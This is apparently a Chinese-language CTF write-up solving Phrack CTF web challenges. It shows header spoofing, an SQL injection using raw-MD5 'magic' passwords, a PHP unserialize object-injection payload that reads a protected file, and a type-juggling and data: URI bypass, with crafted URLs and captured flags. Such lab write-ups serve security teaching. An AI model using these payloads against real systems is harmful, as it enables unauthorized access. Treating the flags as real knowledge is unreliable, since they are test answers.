# Phrack CTF WEB

1. PORT51
    > Please use port 51 to visit this site.

    - curl

2. LOCALHOST
    - `X-Forwarder-For: 127.0.0.1`

3. Login
    - password 129581926211651571912466741651878684928 or 1839431
    - `PCTF{R4w_md5_is_d4ng3rous}`
    - [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
    - [SQL injection with raw MD5 hashes ](http://www.joychou.org/index.php/web/SQL-injection-with-raw-MD5-hashes.html?utm_source=tuicool)

4. 神盾局的秘密
    > 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？

    - 题面源码很短：`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>`
    - 发现参数`img`的值为`c2hpZWxkLmpwZw==`，看起来好像是Base64的样子（根据曹小白的说法：1. 末尾有等号；2. 大小写混杂，解码后发现为`shield.jpg`，进一步验证想法。
    - 通过 `view-source:http://web.phrack.top:32779/showimg.php?img=c2hvd2ltZy5waHA=` 查看 `showimg.php` 源码：
        ```
        <?php
        	$f = $_GET['img'];
        	if (!empty($f)) {
        		$f = base64_decode($f);
        		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
        		&& stripos($f,'pctf')===FALSE) {
        			readfile($f);
        		} else {
        			echo "File not found!";
        		}
        	}
        ?>
        ```
    - `showimg.php` 源码中规定了`img`参数的打开规则：
        - 不允许包含`..`, `/`, `\\`, `pctf` 等字符
        - 传入的参数需要经过Base64编码
    - 尝试通过 `view-source:http://web.phrack.top:32779/showimg.php?img=aW5kZXgucGhw` 查看 `index.php` ：
        ```
        <?php
        	require_once('shield.php');
        	$x = new Shield();
        	isset($_GET['class']) && $g = $_GET['class'];
        	if (!empty($g)) {
        		$x = unserialize($g);
        	}
        	echo $x->readfile();
        ?>
        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
        ```
    - 发现一个叫做`shield.php`的东西，`view-source:http://web.phrack.top:32779/showimg.php?img=c2hpZWxkLnBocA==` 得到：
        ```
        <?php
        	//flag is in pctf.php
        	class Shield {
        		public $file;
        		function __construct($filename = '') {
        			$this -> file = $filename;
        		}

        		function readfile() {
        			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
        			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
        				return @file_get_contents($this->file);
        			}
        		}
        	}
        ?>
        ```
    - 发现`//flag is in pctf.php`，简直开心，直接访问`view-source:http://web.phrack.top:32779/showimg.php?img=cGN0Zi5waHA=`获取flag，然而`File not found!`。
    - 返回去研究`index.php`源码，发现还有个名为`class`的参数未用。由源码，`class`应为经过序列化的一个名为`Shield`的类，定义见`shield.php`。
    - 通过以下代码生成需要传入`class`的值：
        ```
        <?php
        class Shield {
            public $file;
            function __construct($filename = 'pctf.php') {
                $this -> file = $filename;
            }

            function readfile() {
                if (!empty($this->file) && stripos($this->file,'..')===FALSE
                && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                    return @file_get_contents($this->file);
                }
            }
        }
        $x = new Shield();
        // $g = "O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}";
        $g = serialize($x);
        echo str_replace("\"", "%22", $g);  //强序列化后的内容转换为url中可传入的参数
        // echo $g;
        ?>
        ```
    - 得到页面源代码：
        ```
        <?php
        	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
        	//Fake flag:
        	echo "FLAG: PCTF{I_4m_not_fl4g}"
        ?>
        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
        ```
    - `PCTF{W3lcome_To_Shi3ld_secret_Ar3a}`

5. IN A Mess

    > 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。

    - 页面内容`work harder!harder!harder!`
    - 查看源代码，发现只有一行：`<!--index.phps-->work harder!harder!harder!`。 **仔细** 观察，发现`index.phps`是什么鬼东西，遂打开看看。
    - 得到代码如下：
        ```
        if(!$_GET['id'])
        {
            header('Location: index.php?id=1');
            exit();
        }
        $id=$_GET['id'];
        $a=$_GET['a'];
        $b=$_GET['b'];
        if(stripos($a,'.'))
        {
            echo 'Hahahahahaha';
            return ;
        }
        $data = @file_get_contents($a,'r');
        if ($data=="1112 is a nice lab!" and
            $id==0 and
            strlen($b)>5 and
            eregi("111".substr($b,0,1),"1114") and
            substr($b,0,1)!=4)
        {
            require("flag.txt");
        }
        else
        {
            print "work harder!harder!harder!";
        }
        ```
    - 通过代码可以得知，如果我们想要得到`flag.txt`则需要以下满足五个条件：
        1. `$data=="1112 is a nice lab!"`，其中`$data = @file_get_contents($a,'r')`
        2. `$id==0`
        3. `strlen($b)>5`
        4. `eregi("111".substr($b,0,1),"1114")`
        5. `substr($b,0,1)!=4`
    - 所以构造出可以获得flag的连接：`index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`，获得
    - [PHP中的header函数](http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html)
    -

6. RE?
    - so文件
